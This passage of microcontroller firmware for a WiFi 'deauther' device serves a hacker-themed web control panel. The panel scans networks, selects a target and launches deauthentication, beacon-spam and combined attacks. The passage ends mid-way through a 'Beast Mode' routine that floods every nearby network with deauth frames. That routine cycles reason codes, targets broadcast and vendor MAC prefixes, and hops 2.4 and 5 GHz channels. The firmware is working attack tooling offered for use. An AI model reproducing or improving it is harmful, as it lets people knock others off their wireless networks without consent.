              client.println(".network-item.selected { background-color: rgba(0,255,0,0.15); box-shadow: inset 0 0 5px var(--neon-green); }");
              client.println(".network-name { font-weight: bold; margin-bottom: 5px; text-shadow: 0 0 5px var(--neon-green); font-size: 14px; }");
              client.println(".network-details { font-size: 12px; margin-bottom: 8px; }");

              client.println("@media (max-width: 767px) {");
              client.println("  .network-list { max-height: 250px; }");
              client.println("  .network-item { padding: 12px 10px; }");
              client.println("  .network-item .btn { display: block; width: 100%; margin-top: 8px; }");
              client.println("}");

              // Button styling for a hacker look - enhanced for touch devices
              client.println(".btn { display: inline-block; background-color: rgba(0,0,0,0.7); color: var(--neon-green); border: 1px solid var(--neon-green); padding: 10px 12px; margin: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 14px; text-decoration: none; text-transform: uppercase; box-shadow: 0 0 5px var(--neon-green); transition: all 0.3s; min-height: 44px; min-width: 44px; text-align: center; }");
              client.println(".btn:hover, .btn:focus { background-color: rgba(0,255,0,0.2); box-shadow: 0 0 10px var(--neon-green); outline: none; }");
              client.println(".btn:active { background-color: var(--neon-green); color: black; }");
              client.println(".btn-danger { border-color: var(--danger); color: var(--danger); box-shadow: 0 0 5px var(--danger); }");
              client.println(".btn-danger:hover, .btn-danger:focus { background-color: rgba(255,0,0,0.2); box-shadow: 0 0 10px var(--danger); outline: none; }");
              client.println(".btn-danger:active { background-color: var(--danger); color: black; }");

              // Media queries for buttons
              client.println("@media (max-width: 767px) {");
              client.println("  .btn { width: 100%; margin: 4px 0; }");
              client.println("  .power-buttons .btn { padding: 8px 0; }");
              client.println("  .attack-btn { margin-bottom: 8px; }");
              client.println("}");

              // Scan button with animation
              client.println(".scan-btn { display: block; width: 100%; text-align: center; margin: 8px 0; position: relative; overflow: hidden; }");
              client.println(".scan-btn::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(0,255,0,0.4), transparent); animation: scan-animation 2s infinite; }");
              client.println("@keyframes scan-animation { 0% { left: -100%; } 100% { left: 100%; } }");

              // Target information display
              client.println(".target-info { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }");
              client.println(".target-detail { border: 1px solid var(--neon-green); padding: 8px; margin-bottom: 5px; }");
              client.println(".target-label { font-size: 12px; opacity: 0.8; margin-bottom: 3px; }");
              client.println(".target-value { font-size: 14px; font-weight: bold; text-shadow: 0 0 5px var(--neon-green); }");

              // Attack options panel
              client.println(".attack-options { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-top: 10px; }");
              client.println(".attack-btn { text-align: center; }");

              // Power indicator with slider styles
              client.println(".power-meter { margin: 10px 0; }");
              client.println(".power-bar { height: 15px; background-color: rgba(0,255,0,0.1); border: 1px solid var(--neon-green); position: relative; margin-bottom: 10px; }");
              client.println(".power-fill { height: 100%; background-color: var(--neon-green); width: " + String(perdeauth * 10) + "%; box-shadow: 0 0 10px var(--neon-green); transition: width 0.3s; }");
              client.println(".power-label { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }");

              // Slider container and styling
              client.println(".slider-container { position: relative; margin: 20px 0 10px 0; }");
              client.println(".power-slider { -webkit-appearance: none; width: 100%; height: 20px; background: rgba(0,255,0,0.1); outline: none; opacity: 0.9; transition: opacity 0.2s; border: 1px solid var(--neon-green); }");
              client.println(".power-slider:hover { opacity: 1; }");
              client.println(".power-slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 18px; height: 30px; background: var(--neon-green); cursor: pointer; box-shadow: 0 0 10px var(--neon-green); }");
              client.println(".power-slider::-moz-range-thumb { width: 18px; height: 30px; background: var(--neon-green); cursor: pointer; box-shadow: 0 0 10px var(--neon-green); border: none; }");

              // Slider markers
              client.println(".slider-markers { display: flex; justify-content: space-between; padding: 0 5px; margin-top: 8px; }");
              client.println(".slider-markers span { font-size: 10px; position: relative; color: var(--neon-green); width: 20px; text-align: center; }");
              client.println(".slider-markers span.active { color: var(--bright-green); text-shadow: 0 0 5px var(--neon-green); }");
              client.println(".slider-markers span::before { content: '|'; position: absolute; top: -15px; left: 50%; transform: translateX(-50%); }");

              // Set power button
              client.println("#set-power-btn { display: block; width: 100%; margin-top: 10px; font-size: 14px; text-align: center; }");

              // Console output - enhanced for mobile
              client.println(".console-content { font-family: 'Courier New', monospace; padding: 5px; height: calc(100% - 30px); overflow-y: auto; -webkit-overflow-scrolling: touch; }");
              client.println(".console-text { color: var(--neon-green); white-space: pre-wrap; line-height: 1.5; text-shadow: 0 0 2px var(--neon-green); }");
              client.println(".console-prompt { color: var(--bright-green); }");

              client.println("@media (max-width: 767px) {");
              client.println("  .console-text { font-size: 12px; }");
              client.println("  .console-content { padding: 8px; }");
              client.println("}");

              // Animation and visual effects
              client.println(".blink { animation: blink 1s step-end infinite; }");
              client.println("@keyframes blink { 50% { opacity: 0; } }");

              // Status indicators
              client.println(".status-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; animation: pulse 2s infinite; }");
              client.println(".status-active { background-color: var(--neon-green); box-shadow: 0 0 5px var(--neon-green); }");
              client.println(".status-inactive { background-color: #555; }");
              client.println("@keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }");

              // Stats display with grid
              client.println(".stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }");
              client.println(".stat-box { border: 1px solid var(--neon-green); padding: 8px; text-align: center; }");
              client.println(".stat-value { font-size: 18px; font-weight: bold; margin-bottom: 5px; text-shadow: 0 0 5px var(--neon-green); }");
              client.println(".stat-label { font-size: 12px; opacity: 0.8; }");

              // Matrix-like background effect
              client.println(".matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.05; pointer-events: none; overflow: hidden; }");
              client.println(".matrix-rain { position: absolute; color: var(--neon-green); font-family: monospace; font-size: 14px; text-align: center; }");

              // Terminal scan lines
              client.println(".scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, rgba(0,0,0,0), rgba(0,255,0,0.03), rgba(0,0,0,0)); background-size: 100% 5px; pointer-events: none; z-index: 10; animation: scanline 10s linear infinite; }");
              client.println("@keyframes scanline { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }");

              // Box glow effect on hover
              client.println(".box:hover { box-shadow: 0 0 10px var(--neon-green); }");

              // Corner accents for all panels
              client.println(".panel-corners { position: relative; }");
              client.println(".panel-corners::before, .panel-corners::after, .panel-corners > span::before, .panel-corners > span::after { content: ''; position: absolute; width: 10px; height: 10px; border-color: var(--neon-green); }");
              client.println(".panel-corners::before { top: 0; left: 0; border-top: 1px solid; border-left: 1px solid; }");
              client.println(".panel-corners::after { top: 0; right: 0; border-top: 1px solid; border-right: 1px solid; }");
              client.println(".panel-corners > span::before { bottom: 0; left: 0; border-bottom: 1px solid; border-left: 1px solid; }");
              client.println(".panel-corners > span::after { bottom: 0; right: 0; border-bottom: 1px solid; border-right: 1px solid; }");

              client.println("</style>");
              client.println("</head>");
              client.println("<body>");

              // Scanline effect
              client.println("<div class='scanline'></div>");

              // Matrix background effect div
              client.println("<div class='matrix-bg' id='matrix-background'></div>");

              // Scanline effect
              client.println("<div class='scanline'></div>");

              // Main grid container
              client.println("<div class='grid-container'>");

              // Title panel
              client.println("<div class='title-panel panel-corners'><span>");
              client.println("PHATZ 5G DEAUTHER COMMAND CENTER");
              client.println("</span></div>");

              // Network panel
              client.println("<div class='network-panel box panel-corners'><span>");
              client.println("<div class='panel-header'>NETWORK LIST <div class='status-indicator status-active'></div></div>");
              client.println("<a href='/scan' class='btn scan-btn'>SCAN NETWORKS</a>");
              client.println("<div class='network-list'>");

              // List all networks with enhanced styling
              for (size_t i = 0; i < scan_results.size(); i++) {
                String networkClass = (i == (size_t)scrollindex) ? "network-item selected" : "network-item";
                client.println("<div class='" + networkClass + "'>");
                client.println("<div class='network-name'>" + scan_results[i].ssid + "</div>");
                client.println("<div class='network-details'>CH: " + String(scan_results[i].channel) + 
                  " | " + String(scan_results[i].rssi) + " dBm | " + 
                  (scan_results[i].channel >= 36 ? "5GHz" : "2.4GHz") + "</div>");
                client.println("<a href='/target/" + String(i) + "' class='btn'>SELECT</a>");
                client.println("</div>");
              }

              client.println("</div>"); // end network-list
              client.println("</span></div>"); // end network-panel

              // Attack panel
              client.println("<div class='attack-panel box panel-corners'><span>");
              client.println("<div class='panel-header'>ATTACK OPTIONS <div class='status-indicator status-active'></div></div>");
              client.println("<div class='attack-options'>");
              client.println("<a href='/attack/single' class='btn attack-btn'>SINGLE</a>");
              client.println("<a href='/attack/all' class='btn attack-btn'>DEAUTH ALL</a>");
              client.println("<a href='/attack/beacon' class='btn attack-btn'>BEACON</a>");
              client.println("<a href='/attack/combo' class='btn attack-btn'>COMBO</a>");
              client.println("<a href='/attack/beast' class='btn btn-danger attack-btn'>BEAST</a>");
              client.println("</div>"); // end attack-options
              client.println("</span></div>"); // end attack-panel

              // Stats panel
              client.println("<div class='stats-panel box panel-corners'><span>");
              client.println("<div class='panel-header'>SYSTEM STATUS <div class='status-indicator status-active'></div></div>");

              client.println("<div class='stats-grid'>");
              client.println("<div class='stat-box'>");
              client.println("<div class='stat-value'>" + String(scan_results.size()) + "</div>");
              client.println("<div class='stat-label'>NETWORKS</div>");
              client.println("</div>");

              client.println("<div class='stat-box'>");
              client.println("<div class='stat-value'>" + String(perdeauth) + "</div>");
              client.println("<div class='stat-label'>POWER</div>");
              client.println("</div>");

              client.println("<div class='stat-box'>");
              client.println("<div class='stat-value blink'>READY</div>");
              client.println("<div class='stat-label'>STATUS</div>");
              client.println("</div>");

              client.println("<div class='stat-box'>");
              client.println("<div class='stat-value'>PHATZ</div>");
              client.println("<div class='stat-label'>DEVICE</div>");
              client.println("</div>");
              client.println("</div>"); // end stats-grid

              // Power meter with slider
              client.println("<div class='power-meter'>");
              client.println("<div class='power-label'><span>ATTACK POWER</span><span id='power-value'>" + String(perdeauth) + "/10</span></div>");
              client.println("<div class='power-bar'><div class='power-fill'></div></div>");

              // Slider control for attack power
              client.println("<div class='slider-container'>");
              client.println("<input type='range' min='1' max='10' value='" + String(perdeauth) + "' class='power-slider' id='power-slider'>");
              client.println("<div class='slider-markers'>");
              for (int i = 1; i <= 10; i++) {
                client.println("<span" + String(i == perdeauth ? " class='active'" : "") + ">" + String(i) + "</span>");
              }
              client.println("</div>"); // end slider-markers
              client.println("</div>"); // end slider-container

              // Set Power button
              client.println("<button id='set-power-btn' class='btn'>SET POWER</button>");
              client.println("</div>"); // end power-meter

              client.println("</span></div>"); // end stats-panel

              // Target panel (replaces scanner panel)
              client.println("<div class='target-panel box panel-corners'><span>");
              client.println("<div class='panel-header'>TARGET INFORMATION <div class='status-indicator status-active'></div></div>");

              client.println("<div class='target-info'>");
              client.println("<div class='target-detail'>");
              client.println("<div class='target-label'>NETWORK SSID</div>");
              client.println("<div class='target-value'>" + SelectedSSID + "</div>");
              client.println("</div>");

              client.println("<div class='target-detail'>");
              client.println("<div class='target-label'>CHANNEL</div>");
              client.println("<div class='target-value'>" + String(scan_results[scrollindex].channel) + " (" + SSIDCh + ")</div>");
              client.println("</div>");

              client.println("<div class='target-detail'>");
              client.println("<div class='target-label'>SIGNAL STRENGTH</div>");
              client.println("<div class='target-value'>" + String(scan_results[scrollindex].rssi) + " dBm</div>");
              client.println("</div>");

              client.println("<div class='target-detail'>");
              client.println("<div class='target-label'>MAC ADDRESS</div>");
              char bssidStr[18];
              sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                      scan_results[scrollindex].bssid[0], 
                      scan_results[scrollindex].bssid[1],
                      scan_results[scrollindex].bssid[2],
                      scan_results[scrollindex].bssid[3],
                      scan_results[scrollindex].bssid[4],
                      scan_results[scrollindex].bssid[5]);
              client.println("<div class='target-value'>" + String(bssidStr) + "</div>");
              client.println("</div>");
              client.println("</div>"); // end target-info

              client.println("</span></div>"); // end target-panel

              // Console panel
              client.println("<div class='console-panel box panel-corners'><span>");
              client.println("<div class='panel-header'>TERMINAL OUTPUT <div class='status-indicator status-active blink'></div></div>");
              client.println("<div class='console-content'>");
              client.println("<div class='console-text'>");

              // Enhanced console output with prompt characters
              if (commandProcessed) {
                if (attackType != "") {
                  client.println("<span class='console-prompt'>root@phatz:~# </span>execute_attack --type=\"" + attackType + "\" --target=\"" + SelectedSSID + "\"");
                  client.println("[+] Attack type: " + attackType);
                  client.println("[+] Target network: " + SelectedSSID);
                  client.println("[+] Attack power: " + String(perdeauth) + "/10");
                  client.println("[+] Channel: " + String(scan_results[scrollindex].channel) + " (" + SSIDCh + ")");
                  client.println("[*] Target locked. Initializing attack sequence...");
                  client.println("[!] EXECUTING ATTACK - PACKETS BEING TRANSMITTED");
                } else if (request.indexOf("/scan") >= 0) {
                  client.println("<span class='console-prompt'>root@phatz:~# </span>scan_networks --full");
                  client.println("[+] Scanning all available channels");
                  client.println("[+] Scan complete");
                  client.println("[+] Found " + String(scan_results.size()) + " networks");
                  client.println("[+] Networks sorted by signal strength");
                  client.println("[*] System ready for target selection");
                } else if (request.indexOf("/target/") >= 0) {
                  client.println("<span class='console-prompt'>root@phatz:~# </span>select_target --id=" + String(scrollindex));
                  client.println("[+] Target changed: " + SelectedSSID);
                  client.println("[+] Channel: " + String(scan_results[scrollindex].channel) + " (" + SSIDCh + ")");
                  client.println("[+] RSSI: " + String(scan_results[scrollindex].rssi) + " dBm");
                  client.println("[+] BSSID: " + String(bssidStr));
                  client.println("[*] Target acquired and locked. Ready for attack commands.");
                } else if (request.indexOf("/power/") >= 0) {
                  client.println("<span class='console-prompt'>root@phatz:~# </span>set_power --level=" + String(perdeauth));
                  client.println("[+] Attack power updated to level: " + String(perdeauth) + "/10");
                  client.println("[!] WARNING: Higher power levels increase attack effectiveness");
                  client.println("[!] WARNING: But may also increase detection risk and device heat");
                } else if (request.indexOf("/stop") >= 0) {
                  client.println("<span class='console-prompt'>root@phatz:~# </span>stop_attack --force");
                  client.println("[!] EMERGENCY STOP COMMAND RECEIVED");
                  client.println("[+] Terminating all attack operations");
                  client.println("[+] Stopping packet transmission");
                  client.println("[+] System returned to idle state");
                  client.println("[*] Ready for new commands");
                }
              } else {
                client.println("<span class='console-prompt'>root@phatz:~# </span>initialize_system");
                client.println("[+] PHATZ 5G DEAUTHER v2.0 initialized");
                client.println("[+] Firmware: PHATZ-HACK-5GHZ-DEAUTH");
                client.println("[+] Device ready and waiting for commands");
                client.println("[*] Select a target network and attack mode to begin");
                client.println("<span class='console-prompt blink'>root@phatz:~# </span>");
              }

              client.println("</div>"); // end console-text
              client.println("</div>"); // end console-content
              client.println("</span></div>"); // end console-panel

              client.println("</div>"); // end grid-container

              // Add a large floating stop button that's always visible and mobile-friendly
              client.println("<style>");
              client.println("  .stop-btn-container { position:fixed; bottom:20px; right:20px; z-index:1000; width:auto; }");
              client.println("  .stop-btn { font-size:16px; padding:15px 25px; border:2px solid #ff2222; box-shadow:0 0 15px #ff2222; animation:pulse 1.5s infinite; }");
              client.println("  @media (max-width: 767px) {");
              client.println("    .stop-btn-container { left:0; right:0; bottom:0; padding:10px; background:rgba(0,0,0,0.8); width:100%; text-align:center; }");
              client.println("    .stop-btn { width:90%; max-width:300px; margin:0 auto; padding:15px 0; }");
              client.println("  }");
              client.println("</style>");

              // Add animation for the stop button
              client.println("<style>");
              client.println("@keyframes pulse {");
              client.println("  0% { transform: scale(1); box-shadow: 0 0 10px #ff2222; }");
              client.println("  50% { transform: scale(1.05); box-shadow: 0 0 20px #ff2222; }");
              client.println("  100% { transform: scale(1); box-shadow: 0 0 10px #ff2222; }");
              client.println("}");
              client.println("</style>");

              // Enhanced script for terminal and matrix effects
              client.println("<script>");

              // Console terminal effect with advanced prompt
              client.println("const consoleContent = document.querySelector('.console-content');");
              client.println("const consoleText = document.querySelector('.console-text');");

              // Ensure console is scrolled to bottom
              client.println("function scrollConsoleToBottom() {");
              client.println("  consoleContent.scrollTop = consoleContent.scrollHeight;");
              client.println("}");

              // Initial scroll
              client.println("scrollConsoleToBottom();");

              // Add blinking cursor to last prompt
              client.println("function updateCursor() {");
              client.println("  const lastPrompt = document.querySelector('.console-prompt.blink');");
              client.println("  if (lastPrompt) {");
              client.println("    if (lastPrompt.innerHTML.endsWith('█')) {");
              client.println("      lastPrompt.innerHTML = lastPrompt.innerHTML.slice(0, -1) + '  ';");
              client.println("    } else {");
              client.println("      lastPrompt.innerHTML = lastPrompt.innerHTML.slice(0, -2) + '█ ';");
              client.println("    }");
              client.println("  }");
              client.println("}");
              client.println("setInterval(updateCursor, 500);");

              // Matrix digital rain effect
              client.println("function createMatrixBackground() {");
              client.println("  const matrixBg = document.getElementById('matrix-background');");
              client.println("  const width = window.innerWidth;");
              client.println("  const height = window.innerHeight;");
              client.println("  const columns = Math.floor(width / 15);");

              client.println("  // Create initial characters");
              client.println("  const characters = ['0', '1', '7', '3', '5', '9', '+', '*', '>', '<', '=', '$', '!', '&'];");
              client.println("  const drops = [];");

              // Initialize drops
              client.println("  for (let i = 0; i < columns; i++) {");
              client.println("    drops[i] = Math.floor(Math.random() * -20);");
              client.println("  }");

              // Create and position matrix characters
              client.println("  function drawMatrix() {");
              client.println("    matrixBg.innerHTML = '';");
              client.println("    for (let i = 0; i < columns; i++) {");
              client.println("      if (drops[i] * 20 > height) {");
              client.println("        drops[i] = Math.floor(Math.random() * -20);");
              client.println("      }");

              client.println("      if (Math.random() > 0.975) {");
              client.println("        const char = document.createElement('div');");
              client.println("        char.className = 'matrix-rain';");
              client.println("        char.textContent = characters[Math.floor(Math.random() * characters.length)];");
              client.println("        char.style.left = (i * 15) + 'px';");
              client.println("        char.style.top = (drops[i] * 20) + 'px';");
              client.println("        matrixBg.appendChild(char);");
              client.println("        drops[i]++;");
              client.println("      }");
              client.println("    }");
              client.println("  }");

              client.println("  setInterval(drawMatrix, 100);");
              client.println("}");

              // Initialize matrix effect
              client.println("createMatrixBackground();");

              // Add subtle glitch effect to panels
              client.println("function addGlitchEffect() {");
              client.println("  const panels = document.querySelectorAll('.box');");
              client.println("  setInterval(() => {");
              client.println("    if (Math.random() > 0.9) {");
              client.println("      const panel = panels[Math.floor(Math.random() * panels.length)];");
              client.println("      const originalBoxShadow = panel.style.boxShadow;");
              client.println("      panel.style.boxShadow = '0 0 15px #00ff00';");
              client.println("      setTimeout(() => {");
              client.println("        panel.style.boxShadow = originalBoxShadow;");
              client.println("      }, 100);");
              client.println("    }");
              client.println("  }, 2000);");
              client.println("}");

              client.println("addGlitchEffect();");

              // Add dynamic typing effect for new messages
              client.println("function typeText(element, text, speed = 20) {");
              client.println("  let i = 0;");
              client.println("  element.innerHTML = '';");
              client.println("  const timer = setInterval(() => {");
              client.println("    if (i < text.length) {");
              client.println("      element.innerHTML += text.charAt(i);");
              client.println("      i++;");
              client.println("      scrollConsoleToBottom();");
              client.println("    } else {");
              client.println("      clearInterval(timer);");
              client.println("    }");
              client.println("  }, speed);");
              client.println("}");

              // Slider functionality
              client.println("document.addEventListener('DOMContentLoaded', function() {");
              client.println("  const powerSlider = document.getElementById('power-slider');");
              client.println("  const powerValue = document.getElementById('power-value');");
              client.println("  const powerFill = document.querySelector('.power-fill');");
              client.println("  const setPowerBtn = document.getElementById('set-power-btn');");
              client.println("  const sliderMarkers = document.querySelectorAll('.slider-markers span');");

              client.println("  // Update power display when slider moves");
              client.println("  powerSlider.addEventListener('input', function() {");
              client.println("    const value = this.value;");
              client.println("    powerValue.textContent = value + '/10';");
              client.println("    powerFill.style.width = (value * 10) + '%';");

              client.println("    // Update marker styling");
              client.println("    sliderMarkers.forEach((marker, index) => {");
              client.println("      if (index + 1 <= value) {");
              client.println("        marker.classList.add('active');");
              client.println("      } else {");
              client.println("        marker.classList.remove('active');");
              client.println("      }");
              client.println("    });");

              client.println("    // Add cyber glow effect when sliding");
              client.println("    powerFill.style.boxShadow = `0 0 ${10 + value * 2}px var(--neon-green)`;");
              client.println("  });");

              client.println("  // Set Power button handler");
              client.println("  setPowerBtn.addEventListener('click', function() {");
              client.println("    const value = powerSlider.value;");
              client.println("    window.location.href = '/power/' + value;");
              client.println("  });");

              client.println("  // Make slider markers clickable");
              client.println("  sliderMarkers.forEach((marker, index) => {");
              client.println("    marker.addEventListener('click', function() {");
              client.println("      const value = index + 1;");
              client.println("      powerSlider.value = value;");
              client.println("      powerValue.textContent = value + '/10';");
              client.println("      powerFill.style.width = (value * 10) + '%';");

              client.println("      // Update all markers");
              client.println("      sliderMarkers.forEach((m, i) => {");
              client.println("        if (i + 1 <= value) {");
              client.println("          m.classList.add('active');");
              client.println("        } else {");
              client.println("          m.classList.remove('active');");
              client.println("        }");
              client.println("      });");
              client.println("    });");
              client.println("  });");
              client.println("});");

              client.println("</script>");

              client.println("</body>");
              client.println("</html>");

              // Process any attack command that was received
              if (attackType == "SINGLE") {
                drawAttackScreen(0);
                Single();
                clearStopRequest(); // Clear stop flag after attack completes
                resetWebServer(); // Reset server after attack completes
              } else if (attackType == "ALL") {
                drawAttackScreen(1);
                All();
                clearStopRequest(); // Clear stop flag after attack completes
                resetWebServer(); // Reset server after attack completes
              } else if (attackType == "BEACON") {
                drawAttackScreen(2);
                Becaon();
                clearStopRequest(); // Clear stop flag after attack completes
                resetWebServer(); // Reset server after attack completes
              } else if (attackType == "COMBO") {
                drawAttackScreen(3);
                BecaonDeauth();
                clearStopRequest(); // Clear stop flag after attack completes
                resetWebServer(); // Reset server after attack completes
              } else if (attackType == "BEAST") {
                drawAttackScreen(4);
                BeastMode();
                clearStopRequest(); // Clear stop flag after attack completes
                resetWebServer(); // Reset server after attack completes
              }



              break;
            } else {
              currentLine = "";
            }
          } else if (c != '\r') {
            currentLine += c;
          }
        }
      }

      // Give the browser time to receive the data
      delay(10);

      // Close the connection
      client.stop();

      // Update display with last connection info
      unsigned long currentTime = millis();
      if (currentTime - lastUpdateTime > 1000) {
        display.fillRect(0, 60, SCREEN_WIDTH, 8, BLACK);
        display.setCursor(5, 60);
        display.print("Last client connected");
        display.display();
        lastUpdateTime = currentTime;
      }
    }

    delay(10);
  }
}

// New function to handle attack menu and execution
// Beast Mode - Ultra aggressive attack on all networks
void BeastMode() {
  clearStopRequest(); // Clear any previous stop requests
  display.clearDisplay();

  // Show stop command info
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.print("Press UP+OK to STOP");
  display.display();
  delay(1000);

  // Start with dramatic warning sequence
  for (int i = 0; i < 3; i++) {
    // Check for early exit button
    if (digitalRead(BTN_OK) == LOW) {
      requestStopAttack();
      return;
    }

    display.clearDisplay();
    display.fillScreen(i % 2 == 0 ? WHITE : BLACK);
    display.setTextColor(i % 2 == 0 ? BLACK : WHITE);
    display.setTextSize(2);
    display.setCursor(15, 15);
    display.print("WARNING!");
    display.setTextSize(1);
    display.setCursor(5, 40);
    display.print("BEAST MODE ACTIVATING");
    display.setCursor(10, 50);
    display.print("MAXIMUM POWER ATTACK");
    display.display();
    delay(300);
  }

  // Skull animation
  for (int i = 0; i < 10; i++) {
    // Check for early exit button
    if (digitalRead(BTN_OK) == LOW) {
      requestStopAttack();
      return;
    }

    display.clearDisplay();

    // Draw animated skull that "powers up"
    int skullSize = 20 + i;
    int centerX = SCREEN_WIDTH/2;
    int centerY = SCREEN_HEIGHT/2;

    // Skull outline
    display.drawRect(centerX - skullSize/2, centerY - skullSize/2, skullSize, skullSize, WHITE);

    // Eyes that flash
    if (i % 2 == 0) {
      display.fillRect(centerX - skullSize/4, centerY - skullSize/4, skullSize/6, skullSize/6, WHITE);
      display.fillRect(centerX + skullSize/8, centerY - skullSize/4, skullSize/6, skullSize/6, WHITE);
    }

    // Jaw
    display.drawLine(centerX - skullSize/3, centerY + skullSize/6, centerX + skullSize/3, centerY + skullSize/6, WHITE);

    // Power indicator
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(40, 10);
    display.print("POWER LEVEL: ");
    display.print(i*10);
    display.print("%");

    // Power up bar
    display.drawRect(10, 55, SCREEN_WIDTH-20, 8, WHITE);
    display.fillRect(12, 57, (SCREEN_WIDTH-24) * i / 10, 4, i % 2 == 0 ? BLACK : WHITE);

    display.display();
    delay(200);
  }

  // Final activation screen
  display.clearDisplay();
  display.fillScreen(WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(2);
  display.setCursor(20, 25);
  display.print("UNLEASHED");
  display.display();
  delay(500);

  // Attack variables
  unsigned long startTime = millis();
  unsigned long lastUpdateTime = 0;
  unsigned long packetCount = 0;
  int channelSwitchCount = 0;
  unsigned long channelSwitchTime = 0;
  int currentChannel = 1;

  // Attack intensity control and thermal management
  int attackIntensity = 100; // Start at 100% intensity
  unsigned long lastThermalCheck = 0;
  const unsigned long THERMAL_CHECK_INTERVAL = 5000; // Check every 5 seconds
  bool thermalThrottling = false;

  // Channel hopping optimization
  int primaryChannels[3] = {1, 6, 11}; // Most commonly used 2.4GHz channels

  // Track channels where we've found networks
  bool channelsWithNetworks[140] = {false}; // Cover all possible channels
  for (size_t i = 0; i < scan_results.size(); i++) {
    channelsWithNetworks[scan_results[i].channel] = true;
  }

  // Target priority - sort networks by importance for attack
  std::vector<size_t> targetPriority;
  for (size_t i = 0; i < scan_results.size(); i++) {
    targetPriority.push_back(i);
  }

  // Sort by signal strength (better signal = higher priority)
  for (size_t i = 0; i < targetPriority.size(); i++) {
    for (size_t j = i + 1; j < targetPriority.size(); j++) {
      if (scan_results[targetPriority[i]].rssi < scan_results[targetPriority[j]].rssi) {
        std::swap(targetPriority[i], targetPriority[j]);
      }
    }
  }

  // More aggressive reason codes for maximum disruption
  uint16_t reason_codes[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

  // Enhanced client MAC addresses to target - include common device patterns
  uint8_t common_macs[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Broadcast
    {0x01, 0x00, 0x5E, 0x00, 0x00, 0x01}, // Multicast
    {0x01, 0x00, 0x0C, 0x00, 0x00, 0x00}, // Cisco multicast
    {0x33, 0x33, 0x00, 0x00, 0x00, 0x01}, // IPv6 multicast
    {0x01, 0x80, 0xC2, 0x00, 0x00, 0x00}, // Bridge multicast
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Zero MAC
    {0xAC, 0x84, 0xC6, 0x00, 0x00, 0x00}, // Common Apple prefix
    {0xA4, 0x83, 0xE7, 0x00, 0x00, 0x00}, // Common Samsung prefix
    {0x00, 0x1A, 0x11, 0x00, 0x00, 0x00}  // Common Google prefix
  };

  // Main attack loop
  while (!stopAttackRequested) {
    // Check for exit condition with improved debounce
    if (digitalRead(BTN_OK) == LOW) {
      // Confirmation counter to prevent accidental exit
      int confirmCount = 0;
      for (int i = 0; i < 5; i++) {
        if (digitalRead(BTN_OK) == LOW) confirmCount++;
        delay(20);
      }
      if (confirmCount >= 4) {
        requestStopAttack();
        break;
      }
    }

    unsigned long currentTime = millis();

    // Thermal management - reduce intensity if running for too long
    if (currentTime - lastThermalCheck > THERMAL_CHECK_INTERVAL) {
      // Simple thermal model - reduce intensity over time
      unsigned long runTimeSeconds = (currentTime - startTime) / 1000;

      if (runTimeSeconds > 300 && attackIntensity > 70) { // After 5 minutes
        attackIntensity = 70; // Reduce to 70%
        thermalThrottling = true;
      } else if (runTimeSeconds > 600 && attackIntensity > 50) { // After 10 minutes
        attackIntensity = 50; // Reduce to 50%
      }

      // Check for power button to boost back to 100%
      if (digitalRead(BTN_UP) == LOW && attackIntensity < 100) {
        attackIntensity = 100;
        thermalThrottling = false;
        // Flash screen to acknowledge power boost
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);
      }

      lastThermalCheck = currentTime;
    }

    // Advanced intelligent channel hopping
    if (currentTime - channelSwitchTime > 120) { // Faster channel hopping
      // Different hopping strategies based on attack runtime
      unsigned long runTimeSeconds = (currentTime - startTime) / 1000;

      if (runTimeSeconds < 60) {
        // First minute: Focus on primary channels and where we know networks exist
        if (channelSwitchCount % 5 == 0) {
          // Target primary channels frequently
          currentChannel = primaryChannels[channelSwitchCount % 3];
        } else if (channelSwitchCount % 5 == 1 && !targetPriority.empty()) {
          // Target the channel of the strongest network
          currentChannel = scan_results[targetPriority[0]].channel;
        } else {
          // Cycle through all channels where we found networks
          for (int i = 1; i < 140; i++) {
            if (channelsWithNetworks[i]) {
              currentChannel = i;
              break;
            }
          }
        }
      } else {
        // After first minute: Use broader channel hopping strategy

        // 80% of time focus on 2.4GHz (more common)
        if (channelSwitchCount % 5 < 4) {
          if (currentChannel >= 36) {
            // Switch back to 2.4GHz
            currentChannel = primaryChannels[channelSwitchCount % 3];
          } else {
            // Sequential scanning within 2.4GHz band
            currentChannel = ((currentChannel + 1) % 11) + 1; // Channels 1-11
          }
        }
        // 20% of time check 5GHz
        else {
          if (currentChannel < 36) {
            // Jump to 5GHz range
            currentChannel = 36 + (channelSwitchCount % 12) * 4; // 5GHz channels (36-116)
          } else {
            // Sequential scanning within 5GHz band - channel increments of 4
            currentChannel = 36 + (((currentChannel - 36) / 4 + 1) % 12) * 4; // Channels 36,40,44,...
          }
        }

        // Every 20 hops, do a complete scan of all channels with known networks
        if (channelSwitchCount % 20 == 0 && runTimeSeconds > 120) {
          // Quick re-scan to update channel information
          wext_set_channel(WLAN0_NAME, primaryChannels[channelSwitchCount % 3]);
          wifi_scan_networks(scanResultHandler, NULL);
          // Update channel map
          for (size_t i = 0; i < scan_results.size(); i++) {
            channelsWithNetworks[scan_results[i].channel] = true;
          }
        }
      }

      // Set the new channel
      wext_set_channel(WLAN0_NAME, currentChannel);
      channelSwitchCount++;
